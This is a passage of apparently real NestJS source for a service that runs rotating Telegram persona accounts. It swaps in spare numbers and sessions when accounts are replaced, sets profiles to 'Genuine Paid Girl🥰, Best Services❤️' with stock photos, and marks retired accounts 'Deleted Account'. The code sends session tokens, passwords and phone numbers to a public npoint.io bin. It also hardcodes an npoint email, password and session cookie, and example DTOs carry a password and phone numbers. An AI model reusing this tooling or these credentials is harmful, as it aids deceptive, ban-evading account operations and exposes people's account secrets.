'./dto/update-client.dto';\nimport { CreateBufferClientDto } from '../buffer-clients/dto/create-buffer-client.dto';\nimport { UpdateBufferClientDto } from '../buffer-clients/dto/update-buffer-client.dto';\nimport * as path from 'path';\nimport { CloudinaryService } from '../../cloudinary';\nimport { SearchClientDto } from './dto/search-client.dto';\nimport { NpointService } from '../n-point/npoint.service';\nimport axios from 'axios';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n\nlet settingupClient = Date.now() - 250000;\n@Injectable()\nexport class ClientService {\n    private clientsMap: Map<string, Client> = new Map();\n    private lastUpdateMap: Map<string, number> = new Map(); // Track last update times\n    constructor(@InjectModel(Client.name) private clientModel: Model<ClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ArchivedClientService))\n        private archivedClientService: ArchivedClientService,\n        private npointSerive: NpointService\n    ) {\n        setInterval(async () => {\n            await this.refreshMap();\n        }, 5 * 60 * 1000);\n    }\n\n    async checkNpoint() {\n        const clients = (await axios.get('https://api.npoint.io/7c2682f37bb93ef486ba')).data;\n        for (const client in clients) {\n            const existingClient = await this.findOne(client, false);\n            if (areJsonsNotSame(existingClient, clients[client])) {\n                await this.findAll();\n                const clientData = mapToJson(this.clientsMap)\n                await this.npointSerive.updateDocument(\"7c2682f37bb93ef486ba\", clientData)\n                const maskedCls = {};\n                for (const client in clientData) {\n                    const { session, mobile, password, promoteMobile, ...maskedClient } = clientData[client];\n                    maskedCls[client] = maskedClient\n                }\n                await this.npointSerive.updateDocument(\"f0d1e44d82893490bbde\", maskedCls)\n                break;\n            }\n        }\n    }\n\n    async create(createClientDto: CreateClientDto): Promise<Client> {\n        const createdUser = new this.clientModel(createClientDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<Client[]> {\n        const clientMapLength = this.clientsMap.size\n        if (clientMapLength < 20) {\n            const results: Client[] = await this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean()\n            for (const client of results) {\n                this.clientsMap.set(client.clientId, client)\n            }\n            console.log(\"Refreshed Clients\")\n            return results\n        } else {\n            return Array.from(this.clientsMap.values())\n        }\n    }\n\n    async findAllMasked(query?: SearchClientDto) {\n        const allClients = await this.findAll()\n        const filteredClients = query\n            ? allClients.filter(client => {\n                return Object.keys(query).every(key => client[key] === query[key]);\n            })\n            : allClients;\n        const results = filteredClients.map(client => {\n            const { session, mobile, password, promoteMobile, ...maskedClient } = client;\n            return maskedClient;\n        });\n        return results;\n    }\n\n    async refreshMap() {\n        console.log(\"Refreshed Clients\")\n        this.clientsMap.clear();\n    }\n\n    async findOne(clientId: string, throwErr: boolean = true): Promise<Client> {\n        const client = this.clientsMap.get(clientId)\n        if (client) {\n            return client;\n        } else {\n            const user = await this.clientModel.findOne({ clientId }, { _id: 0, updatedAt: 0 }).lean().exec();\n            this.clientsMap.set(clientId, user);\n            if (!user && throwErr) {\n                throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n            }\n            return user;\n        }\n    }\n\n    async update(clientId: string, updateClientDto: UpdateClientDto): Promise<Client> {\n        delete updateClientDto['_id']\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n        await fetchWithTimeout(`${notifbot()}&text=Updating the Existing client: ${clientId}`);\n        const updatedUser = await this.clientModel.findOneAndUpdate({ clientId }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        this.clientsMap.set(clientId, updatedUser);\n        await fetchWithTimeout(`${process.env.uptimeChecker}/refreshmap`);\n        await fetchWithTimeout(`${process.env.uptimebot}/refreshmap`);\n        console.log(\"Refreshed Maps\")\n        return updatedUser;\n    }\n\n    async remove(clientId: string): Promise<Client> {\n        const deletedUser = await this.clientModel.findOneAndDelete({ clientId }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<Client[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.clientModel.find(filter).exec();\n    }\n\n    async setupClient(clientId: string, setupClientQueryDto: SetupClientQueryDto) {\n        console.log(`Received New Client Request for - ${clientId}`)\n        if (toBoolean(process.env.AUTO_CLIENT_SETUP) && Date.now() > (settingupClient + 240000)) {\n            settingupClient = Date.now();\n            const existingClient = await this.findOne(clientId);\n            const existingClientMobile = existingClient.mobile\n            await fetchWithTimeout(`${notifbot()}&text=Received New Client Request for - ${clientId} - OldNumber: ${existingClient.mobile} || ${existingClient.username}`);\n            console.log(setupClientQueryDto);\n            await this.telegramService.disconnectAll();\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            const query = { availableDate: { $lte: today }, channels: { $gt: 200 } }\n            const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];\n            try {\n                if (newBufferClient) {\n                    this.telegramService.setActiveClientSetup({ ...setupClientQueryDto, clientId, existingMobile: existingClientMobile, newMobile: newBufferClient.mobile })\n\n                    await this.telegramService.createClient(newBufferClient.mobile);\n                    const newSession = await this.telegramService.createNewSession(newBufferClient.mobile);\n                    await this.telegramService.deleteClient(newBufferClient.mobile)\n                    await this.updateClientSession(newSession)\n                } else {\n                    await fetchWithTimeout(`${notifbot()}&text=Buffer Clients not available`);\n                    console.log(\"Buffer Clients not available\")\n                }\n\n                // const archivedClient = await this.archivedClientService.findOne(newBufferClient.mobile)\n                // if (archivedClient) {\n                //     await fetchWithTimeout(`${notifbot()}&text=Using Old Session from Archived Clients- NewNumber:${newBufferClient.mobile}`);\n                //     await this.updateClientSession(archivedClient.session)\n                // } else {\n                //     await this.telegramService.createClient(newBufferClient.mobile, false, true);\n                //     await this.generateNewSession(newBufferClient.mobile)\n                // }\n            } catch (error) {\n                parseError(error);\n                await this.telegramService.deleteClient(newBufferClient.mobile);\n                console.log(\"Removing buffer as error\")\n                const availableDate = (new Date(Date.now() + (3 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n                await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });\n                this.telegramService.setActiveClientSetup(undefined)\n            }\n        } else {\n            console.log(\"Profile Setup Recently tried, wait ::\", settingupClient - Date.now());\n        }\n    }\n\n    async updateClientSession(newSession: string) {\n        try {\n            const setup = this.telegramService.getActiveClientSetup();\n            const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;\n            await this.telegramService.disconnectAll();\n            await sleep(2000)\n            const client = await this.findOne(clientId);\n            await this.telegramService.createClient(newMobile, false, true);\n            const firstName = (client.name).split(' ')[0];\n            const middleName = (client.name).split(' ')[1];\n            const firstNameCaps = firstName[0].toUpperCase() + firstName.slice(1);\n            const middleNameCaps = middleName ? middleName[0].toUpperCase() + middleName.slice(1) : '';\n            const baseUsername = `${firstNameCaps}_${middleNameCaps.slice(0, 3)}` + fetchNumbersFromString(clientId);\n            const updatedUsername = await this.telegramService.updateUsername(newMobile, baseUsername);\n            await fetchWithTimeout(`${notifbot()}&text=Updated username for NewNumber:${newMobile} || ${updatedUsername}`);\n            await this.telegramService.deleteClient(newMobile);\n            const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];\n            const existingClient = await this.findOne(clientId);\n            this.update(clientId, { mobile: newMobile, username: updatedUsername, session: newSession });\n            await fetchWithTimeout(existingClient.deployKey, {}, 1);\n            await this.bufferClientService.remove(newMobile);\n            setTimeout(async () => {\n                await this.updateClient(clientId);\n            }, 10000);\n\n            try {\n                if (existingClientUser) {\n                    try {\n                        if (toBoolean(formalities)) {\n                            await this.telegramService.createClient(existingMobile, false, true);\n                            console.log(\"Started Formalities\");\n                            await this.telegramService.updateNameandBio(existingMobile, 'Deleted Account', `New Acc: @${updatedUsername}`);\n                            await this.telegramService.deleteProfilePhotos(existingMobile)\n                            await this.telegramService.updateUsername(existingMobile, '');\n                            await this.telegramService.updatePrivacyforDeletedAccount(existingMobile);\n                            console.log(\"Formalities finished\");\n                            await this.telegramService.deleteClient(existingMobile);\n                            await fetchWithTimeout(`${notifbot()}&text=Formalities finished`);\n                        } else {\n                            console.log(\"Formalities skipped\")\n                        }\n                        if (archiveOld) {\n                            const availableDate = (new Date(Date.now() + ((days + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];\n                            const bufferClientDto: CreateBufferClientDto | UpdateBufferClientDto = {\n                                mobile: existingMobile,\n                                availableDate,\n                                session: existingClientUser.session,\n                                tgId: existingClientUser.tgId,\n                                channels: 170\n                            }\n                            const updatedBufferClient = await this.bufferClientService.createOrUpdate(existingMobile, bufferClientDto);\n                            // await this.archivedClientService.update(existingMobile, existingClient);\n                            console.log(\"client Archived: \", updatedBufferClient);\n                            await fetchWithTimeout(`${notifbot()}&text=Client Archived`);\n                        } else {\n                            console.log(\"Client Archive Skipped\")\n                            await fetchWithTimeout(`${notifbot()}&text=Client Archive Skipped`);\n                        }\n                    } catch (error) {\n                        console.log(\"Cannot Archive Old Client\");\n                        const errorDetails = parseError(error);\n                        if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\n                            console.log(\"Deleting User: \", existingClientUser.mobile);\n                            await this.bufferClientService.remove(existingClientUser.mobile);\n                            await this.archivedClientService.remove(existingClientUser.mobile);\n                        } else {\n                            console.log('Not Deleting user');\n                        }\n                    }\n                }\n            } catch (error) {\n                parseError(error);\n            }\n            this.telegramService.setActiveClientSetup(undefined)\n\n            console.log(\"Update finished Exitting Exiiting TG Service\");\n            await fetchWithTimeout(`${notifbot()}&text=Update finished`);\n            await this.telegramService.disconnectAll();\n\n        } catch (e) {\n            parseError(e);\n            this.telegramService.setActiveClientSetup(undefined)\n        }\n    }\n\n    async updateClient(clientId: string) {\n        const now = Date.now();\n        const lastUpdate = this.lastUpdateMap.get(clientId) || 0;\n        const cooldownPeriod = 30000;\n        if (now - lastUpdate < cooldownPeriod) {\n            console.log(`Skipping update for ${clientId} - cooldown period not elapsed. Try again in ${Math.ceil((cooldownPeriod - (now - lastUpdate)) / 1000)} seconds`);\n            return;\n        }\n\n        const client = await this.findOne(clientId);\n        try {\n            this.lastUpdateMap.set(clientId, now);\n            await CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());\n            const telegramClient = await this.telegramService.createClient(client.mobile, true, false);\n            await sleep(2000)\n            const me = await telegramClient.getMe();\n            if (!me.username || me.username !== client.username || !me.username?.toLowerCase().startsWith(me.firstName.split(' ')[0].toLowerCase())) {\n                const client = await this.findOne(clientId);\n                const firstName = (client.name).split(' ')[0];\n                const middleName = (client.name).split(' ')[1];\n                const firstNameCaps = firstName[0].toUpperCase() + firstName.slice(1);\n                const middleNameCaps = middleName ? middleName[0].toUpperCase() + middleName.slice(1) : '';\n                const baseUsername = `${firstNameCaps}_${middleNameCaps.slice(0, 3)}` + fetchNumbersFromString(clientId);\n                const updatedUsername = await telegramClient.updateUsername(baseUsername);\n                await this.update(client.clientId, { username: updatedUsername })\n            }\n            await sleep(1000)\n            if (me.firstName !== client.name) {\n                await telegramClient.updateProfile(client.name, \"Genuine Paid Girl🥰, Best Services❤️\");\n            }\n            await sleep(1000)\n            await telegramClient.deleteProfilePhotos();\n            await sleep(1000)\n            await telegramClient.updatePrivacy();\n            await sleep(1000)\n            const rootPath = process.cwd();\n            console.log(rootPath, \"trying to update dp\");\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(1000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(1000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(1000);\n            await this.telegramService.deleteClient(client.mobile)\n        } catch (error) {\n            // Remove the cooldown on error so it can be retried\n            this.lastUpdateMap.delete(clientId);\n            parseError(error)\n        }\n    }\n\n    async updateClients() {\n        const clients = await this.findAll();\n        for (const client of clients) {\n            await this.updateClient(client.clientId)\n        }\n    }\n\n    async generateNewSession(phoneNumber: string, attempt: number = 1) {\n        try {\n            console.log(\"String Generation started\");\n            await fetchWithTimeout(`${notifbot()}&text=String Generation started for NewNumber:${phoneNumber}`);\n            await sleep(1000);\n            const response = await fetchWithTimeout(`${process.env.uptimebot}/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);\n            if (response) {\n                console.log(`Code Sent successfully`, response.data);\n                await fetchWithTimeout(`${notifbot()}&text=Code Sent successfully`);\n                await this.bufferClientService.update(phoneNumber, { availableDate: (new Date(Date.now() + (24 * 60 * 60 * 1000))).toISOString().split('T')[0] })\n            } else {\n                await fetchWithTimeout(`${notifbot()}&text=Failed to send Code`);\n                console.log(\"Failed to send Code\", response);\n                if (attempt < 2) {\n                    await sleep(8000);\n                    await this.generateNewSession(phoneNumber, attempt + 1);\n                }\n            }\n        } catch (error) {\n            console.log(error);\n            if (attempt < 2) {\n                await sleep(8000);\n                await this.generateNewSession(phoneNumber, attempt + 1);\n            }\n        }\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<Client[]> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.clientModel.find(query);\n\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    async addPromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        return this.clientModel.findOneAndUpdate(\n            { clientId }, // Filter by clientId\n            { $addToSet: { promoteMobile: mobileNumber } }, // Add only if it doesn't already exist\n            { new: true } // Return the updated document\n        ).exec();\n    }\n\n    async removePromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        return this.clientModel.findOneAndUpdate(\n            { clientId }, // Filter by clientId\n            { $pull: { promoteMobile: mobileNumber } }, // Remove the specified number\n            { new: true } // Return the updated document\n        ).exec();\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateClientDto {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    readonly channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    readonly dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    readonly link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    readonly name: string;\n\n    @ApiProperty({ example: '+916265240911', description: 'Phone number of the user' })\n    readonly mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    readonly password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    readonly repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    readonly promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' })\n    readonly session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    readonly username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    readonly clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    readonly deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    readonly mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    readonly product: string;\n\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user', required: false, type: [String] })\n    readonly promoteMobile?: string[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\nimport { IsOptional, IsString, IsArray, IsUrl, Matches, ArrayNotEmpty } from 'class-validator';\n\nexport class SearchClientDto {\n    @ApiPropertyOptional({ description: 'Client ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    @Matches(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' })\n    clientId?: string;\n\n    @ApiPropertyOptional({ description: 'Database collection name' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    dbcoll?: string;\n\n    @ApiPropertyOptional({ description: 'Channel link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    channelLink?: string;\n\n    @ApiPropertyOptional({ description: 'Link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    link?: string;\n\n    @ApiPropertyOptional({ description: 'Name of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    name?: string;\n\n    @ApiPropertyOptional({ description: 'Phone number of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @Matches(/^\\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' })\n    number?: string;\n\n    @ApiPropertyOptional({ description: 'Password of the client' })\n    @IsOptional()\n    @IsString()\n    password?: string;\n\n    @ApiPropertyOptional({ description: 'Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    repl?: string;\n\n    @ApiPropertyOptional({ description: 'Promotion Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    promoteRepl?: string;\n\n    @ApiPropertyOptional({ description: 'Clientname of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    clientName?: string;\n\n    @ApiPropertyOptional({ description: 'Deployment key URL' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    deployKey?: string;\n\n    @ApiPropertyOptional({ description: 'Main account of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    mainAccount?: string;\n\n    @ApiPropertyOptional({ description: 'Product associated with the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    product?: string;\n\n    @ApiPropertyOptional({ description: 'Promote mobile numbers of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.map((v: string) => v?.trim()))\n    @IsOptional()\n    @IsArray()\n    @ArrayNotEmpty({ message: 'Promote mobile numbers must not be empty if provided' })\n    @Matches(/^\\+?[0-9]{10,15}$/, { each: true, message: 'Invalid phone number format in promoteMobile' })\n    promoteMobile?: string[];\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateClientDto } from './create-client.dto';\n\nexport class UpdateClientDto extends PartialType(CreateClientDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type ClientDocument = Client & Document;\n\n@Schema({\n    collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Client {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    @Prop({ required: true })\n    channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    @Prop({ required: true })\n    dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    @Prop({ required: true })\n    link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    @Prop({ required: true })\n    name: string;\n\n    @ApiProperty({ example: '916265240911', description: 'mobile number of the user' })\n    @Prop({ required: true })\n    mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    @Prop({ required: true })\n    password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    @Prop({ required: true })\n    repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    @Prop({ required: true })\n    promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuM==', description: 'Session token' })\n    @Prop({ required: true })\n    session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    @Prop({ required: true })\n    username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    @Prop({ required: true })\n    clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    @Prop({ required: true })\n    deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    @Prop({ required: true })\n    mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    @Prop({ required: true })\n    product: string;\n\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user' })\n    @Prop({ required: false, type: [String] })\n    promoteMobile: string[];\n}\n\nexport const ClientSchema = SchemaFactory.createForClass(Client);\n","import {\n    Controller,\n    Get,\n    Post,\n    Put,\n    Param,\n    Body,\n    HttpException,\n    HttpStatus,\n  } from '@nestjs/common';\n  import { NpointService } from './npoint.service';\n  import {\n    ApiTags,\n    ApiOperation,\n    ApiParam,\n    ApiBody,\n    ApiResponse,\n  } from '@nestjs/swagger';\n  \n  @ApiTags('NPoint API') // Group endpoints under \"NPoint API\" in Swagger UI\n  @Controller('npoint')\n  export class NpointController {\n    constructor(private readonly npointService: NpointService) {}\n  \n    @Get('documents/:id')\n    @ApiOperation({ summary: 'Fetch a document by ID' }) // Description of the endpoint\n    @ApiParam({ name: 'id', description: 'The ID of the document to fetch' }) // Document the parameter\n    @ApiResponse({\n      status: 200,\n      description: 'Document fetched successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async fetchDocument(@Param('id') id: string) {\n      try {\n        return await this.npointService.fetchDocument(id);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  \n    @Post('documents')\n    @ApiOperation({ summary: 'Post a new document' })\n    @ApiBody({\n      description: 'The document to post',\n      schema: {\n        example: {\n          title: 'My Document',\n          content: 'This is the content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 201,\n      description: 'Document posted successfully',\n    })\n    @ApiResponse({ status: 400, description: 'Invalid input' })\n    async postDocument(@Body() document: any) {\n      try {\n        return await this.npointService.postDocument(document);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\n      }\n    }\n\n    @Get('documents')\n    @ApiOperation({ summary: 'Fetch all documents' })\n    @ApiResponse({\n      status: 200,\n      description: 'List of all documents fetched successfully',\n    })\n    @ApiResponse({ status: 500, description: 'Internal server error' })\n    async fetchAllDocuments() {\n      try {\n        return await this.npointService.fetchAllDocuments();\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\n      }\n    }  \n  \n    @Put('documents/:id')\n    @ApiOperation({ summary: 'Update a document by ID' })\n    @ApiParam({ name: 'id', description: 'The ID of the document to update' })\n    @ApiBody({\n      description: 'The updated document',\n      schema: {\n        example: {\n          title: 'Updated Document',\n          content: 'This is the updated content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 200,\n      description: 'Document updated successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async updateDocument(@Param('id') id: string, @Body() updatedDocument: any) {\n      try {\n        return await this.npointService.updateDocument(id, updatedDocument);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  }","import { Module } from '@nestjs/common';\nimport { NpointService } from './npoint.service';\nimport { NpointController } from './npoint.controller';\n\n@Module({\n  controllers: [NpointController],\n  providers: [NpointService],\n  exports: [NpointService]\n})\nexport class NpointModule {}","import { Injectable, Logger } from '@nestjs/common';\nimport axios from 'axios';\n\n@Injectable()\nexport class NpointService {\n    private readonly logger = new Logger(NpointService.name);\n    private csrfToken: string | null = null;\n    private cookie: string | null = '_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';\n    private readonly baseUrl = 'https://www.npoint.io'; // Replace with your API base URL\n    private readonly signInUrl = 'https://www.npoint.io/users/sign_in'; // Replace with your sign-in API URL\n\n    // Method to fetch CSRF token from the sign-in API\n    private async fetchCsrfToken(): Promise<string> {\n        this.logger.debug('Fetching CSRF token...');\n        try {\n            let data = JSON.stringify({\n                \"user\": {\n                    \"email\": \"dodieajt@gmail.com\",\n                    \"password\": \"Ajtdmwajt1@\"\n                }\n            });\n\n            let config = {\n                method: 'post',\n                maxBodyLength: Infinity,\n                url: this.signInUrl,\n                headers: {\n                    'Content-Type': 'application/json',\n                    'Cookie': this.cookie\n                },\n                data: data\n            };\n\n            const response = await axios.request(config)\n            console.log(\"Cookie:\", response.headers['set-cookie'][0]);\n            this.cookie = response.headers['set-cookie'][0];\n            // Extract CSRF token from the response (adjust based on your API response structure)\n            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);\n\n            if (!this.csrfToken) {\n                throw new Error('CSRF token not found in the sign-in response.');\n            }\n\n            this.logger.debug('CSRF token fetched successfully.');\n            return this.csrfToken;\n        } catch (error) {\n            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);\n            throw new Error(`Failed to fetch CSRF token: ${error.message}`);\n        }\n    }\n\n    // Method to ensure CSRF token is available\n    private async ensureCsrfToken(): Promise<void> {\n        if (!this.csrfToken) {\n            await this.fetchCsrfToken();\n        }\n    }\n\n    // Method to fetch a document\n    async fetchDocument(documentId: string): Promise<any> {\n        this.logger.debug(`Fetching document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents/${documentId}`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to fetch document: ${error.message}`);\n        }\n    }\n\n    // Method to post a document\n    async postDocument(document: any): Promise<any> {\n        this.logger.debug('Posting a new document...');\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.post(`${this.baseUrl}/documents`, { \"generate_contents\": true }, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);\n            await this.updateDocument(response.data.token, document);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to post document: ${error.message}`);\n            throw new Error(`Failed to post document: ${error.message}`);\n        }\n    }\n\n    // Method to update a document\n    async updateDocument(documentId: string, updatedDocument: any): Promise<any> {\n        this.logger.debug(`Updating document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        // const oldDocument = (await axios.get(`https://api.npoint.io/${documentId}`)).data;\n        const body =\n        {\n            \"contents\": JSON.stringify(updatedDocument),\n            \"original_contents\": JSON.stringify(updatedDocument),\n            \"schema\": null,\n            \"original_schema\": \"\"\n        }\n\n        try {\n            const response = await axios.put(\n                `${this.baseUrl}/documents/${documentId}`,\n                body,\n                {\n                    headers: {\n                        'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                        'Cookie': this.cookie\n                    },\n                },\n            );\n\n            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to update document: ${error.message}`);\n        }\n    }\n\n    async fetchAllDocuments(): Promise<any[]> {\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            return response.data;\n        } catch (error) {\n            throw new 